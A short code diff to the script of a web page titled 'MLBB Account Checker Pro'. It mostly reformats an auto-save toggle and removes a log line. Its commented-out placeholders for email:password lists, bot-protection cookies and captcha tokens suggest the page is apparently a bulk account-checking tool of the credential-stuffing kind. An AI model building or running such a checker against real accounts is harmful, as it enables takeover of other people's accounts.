-        elements.autoSaveToggle.addEventListener('change', (e) => {
-            autoSaveEnabled = e.target.checked;
-            showToast(autoSaveEnabled ? 'Auto Save ON' : 'Auto Save OFF', 'info');
-            if (autoSaveEnabled && results.length > 0) saveToLocalStorage();
-        });
+        elements.autoSaveToggle.addEventListener('change', (e) => { autoSaveEnabled = e.target.checked; showToast(autoSaveEnabled ? 'Auto Save ON' : 'Auto Save OFF', 'info'); if (autoSaveEnabled && results.length > 0) saveToLocalStorage(); });
         
         // ========== INITIALIZATION ==========
         //elements.accountsInput.value = 'test1@gmail.com:password123\ntest2@gmail.com:pass456';
         //elements.abckInput.value = 'abc123_cookie_example_1\nabc123_cookie_example_2';
         //elements.captchaInput.value = 'captcha_token_example_1\ncaptcha_token_example_2';
-        
         updateApiUrlDisplay();
         loadFromLocalStorage();
         checkApiConnection();
-        
-        console.log('MLBB Account Checker Pro loaded - Dynamic API URL enabled');
     </script>
 </body>
 </html>
